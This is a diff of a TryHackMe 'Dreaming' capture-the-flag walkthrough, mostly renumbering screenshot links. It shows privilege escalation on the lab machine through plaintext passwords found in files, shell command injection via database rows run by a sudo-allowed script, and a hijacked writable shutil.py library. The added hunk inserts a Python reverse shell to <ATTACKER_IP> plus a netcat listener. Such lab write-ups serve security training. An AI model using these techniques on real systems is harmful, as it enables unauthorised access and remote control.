@@ -4,7 +4,7 @@ description: https://tryhackme.com/r/room/dreaming
 
 # Tryhackme - Dreaming Writeup
 
-<figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
 
 ### Welcome to Walktrough of the Dreaming room.&#x20;
 
@@ -272,7 +272,7 @@ We can then run some commands to understand our context
 
 We are www-data we can then go to home directory and see if there is any users.
 
-<figure><img src=".gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (36) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Important: Every of our users are inside this machine. We will need to dig to have access to every flag.
 
@@ -285,7 +285,7 @@ cd /home/lucien
 ls -la
 ```
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 We are not lucien so we cannot open lucien\_flag.txt. None of the file that are readable as www-data seem interesting. Let's try to see if there is any file that we can read that is owned by lucien.
 
@@ -293,7 +293,7 @@ We are not lucien so we cannot open lucien\_flag.txt. None of the file that are 
 find / -type f -readable -user lucien 2>/dev/null
 ```
 
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 ### Important: /opt/test.py
 
@@ -303,7 +303,7 @@ This file is not in lucien's home, let's dig into it and print its content
 cat /opt/test.py
 ```
 
-<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 ### Important: HeyLucien#@1999!
 
@@ -320,7 +320,7 @@ ssh lucien@<IP>
 Enter password: HeyLucien#@1999!
 ```
 
-<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 We are now connected in SSH in home directory of lucien. We can now print the flag since we are connected as the owner of the file.
 
@@ -328,7 +328,7 @@ We are now connected in SSH in home directory of lucien. We can now print the fl
 cat /home/lucien/lucien_flag.txt
 ```
 
-<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
 Flag is redacted here but we have now found the first flag
 
@@ -340,7 +340,7 @@ Now let's dig into the death's directory
 cd /home/death
 ```
 
-<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
 There is a getDreams.py file but we cannot read or execute it since we are lucien and not death user.\
 In the same way we cannot read the flag.
@@ -351,7 +351,7 @@ Same as before Let's see if there is any file owned by death that we can read
 find / -type f -readable -user death 2>/dev/null
 ```
 
-<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
 ### Important: /opt/getDreams.py
 
@@ -429,15 +429,15 @@ getDreams()
 * it connected to a database called `library`&#x20;
 * it then connects to the mysql with the field entered
 
-<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
 * After that it will do a query of `dreamer` and `dream` field of the `dreams` table
 
-<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
 * The most important part is there
 
-<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
 
 * It with gather all the data from the dreamer and dream values in the dreams table and create strings with them `f"echo {dreamer} + {dream}"` . It will after use those strings as if it was a command executing it in the shell. It would be great to insert a reverse shell to this dream value to potentially be executed.
 * it thens close the connection to the database
@@ -448,7 +448,7 @@ getDreams()
 sudo -l
 ```
 
-<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
 
 User lucien may run the following commands on dreaming: \
 (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
@@ -461,7 +461,7 @@ sudo -u death /usr/bin/python3 /home/death/getDreams.py
 
 let's try it:
 
-<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
 
 We have some fields but nothing really interesting.
 
@@ -473,7 +473,7 @@ history
 
 An intersting field comes at line 24
 
-<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
 it seems lucien can connect to the mysql database
 
@@ -483,7 +483,7 @@ mysql -u lucien -plucien42DBPASSWORD
 
 let's try it:
 
-<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
 
 Let's see what Databases we can see using SQL language
 
@@ -491,7 +491,7 @@ Let's see what Databases we can see using SQL language
 SHOW DATABASES;
 ```
 
-<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
 
 We can see the `library` that we were talking about.
 
@@ -507,7 +507,7 @@ We can now List the tables
 SHOW TABLES;
 ```
 
-<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
 
 We have the dreams table let's enumerate its content
 
@@ -515,7 +515,7 @@ We have the dreams table let's enumerate its content
 SELECT * FROM dreams;
 ```
 
-<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
 
 Perfect. We see the same inputs as the command that was run previously with the getDreams file.\
 Sints those strings are inputed as commands:
@@ -567,7 +567,7 @@ Let's use it and Select our table to see the result
 SELECT * FROM dreams;
 ```
 
-<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
 
 Looks good. \
 Now let's setup a listener on our attacker machine on the port we have chosen
@@ -582,7 +582,7 @@ Let's exit the sql with the `exit` keyword and try to run the getDreams.py file 
 sudo -u death python3 /home/death/getDreams.py
 ```
 
-<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
 
 And Boom we are Death now ! We can get the flag we wanted now
 
@@ -590,7 +590,7 @@ And Boom we are Death now ! We can get the flag we wanted now
 cat /home/death/death_flag.txt
 ```
 
-<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
 
 ## FLAG 3 - Morpheus
 
@@ -600,7 +600,7 @@ Now that we are connected with death, let's try to read the getDreams.py that ha
 cat /home/death/getDreams.py
 ```
 
-<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
 
 ### Important: !mementoMORI666!
 
@@ -611,7 +611,7 @@ ssh death@<IP>
 password: !mementoMORI666!
 ```
 
-<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
 
 Perfect. Now Let's go to Morpheus home folder and see what we got
 
@@ -620,7 +620,7 @@ cd /home/morpheus
 ls -la
 ```
 
-<figure><img src=".gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
 
 Important files are:
 
@@ -634,7 +634,7 @@ Let's cat kingdom
 cat kingdom
 ```
 
-<figure><img src=".gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
 
 Not very helpful. Let's try to see restore.py
 
@@ -642,11 +642,12 @@ Not very helpful. Let's try to see restore.py
 cat restore.py
 ```
 
-<figure><img src=".gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
 
 Important Information:
 
 * It uses `shutil` library and calls the `copy2` function renamed as `backup` .
+* It looks like a script that would be run by the system in an automated way.
 
 Let's try to execute it to see what happens
 
@@ -654,7 +655,7 @@ Let's try to execute it to see what happens
 python3 restore.py
 ```
 
-<figure><img src=".gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
 
 It seems it gets a `Permission denied` error after having called the `backup` function.
 
@@ -666,9 +667,9 @@ Let's find the library
 find / -name shutil* -type f 2>/dev/null
 ```
 
-<figure><img src=".gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
 
-## Important: /usr/lib/python3.8/shutil.py
+### Important: /usr/lib/python3.8/shutil.py
 
 Let's see permissions of this library
 
@@ -676,7 +677,7 @@ Let's see permissions of this library
 ls -la /usr/lib/python3.8/shutil.py
 ```
 
-<figure><img src=".gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
 
 We have permissions to edit it since its owned by the group `death` which is our user.
 
@@ -692,5 +693,48 @@ Let's search for copy2 function which is the function that has been renamed in r
 /copy2
 ```
 
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
+Let's try to add a python reverse shell code inside of this function to see if we can have a shell as Morpheus.
+
+Again let's go to reverse shell generator
+
+{% embed url="https://www.revshells.com/" %}
+
+I took the content of python2 in the enclosed quotes. and then separated each lines and removed "`;`"
+
+{% code overflow="wrap" %}
+```python
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("<ATTACKER_IP>",<ATTACKER_PORT>))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+import pty
+pty.spawn("sh")
+```
+{% endcode %}
+
+Once again change the attacker ip and port and input this code into the copy2 function.
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Let's save the file. Now we need to setup a new listener on attacker machine
+
+```sh
+nc -lvnp <ATTACKER_PORT>
+```
+
+Now we have an automatic connection after some time since the script is run by the system user.
+
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+We can now cat the flag and enjoy !
+
+```
+cat /home/morpheus/morpheus_flag.txt
+```
+
+<figure><img src=".gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
 
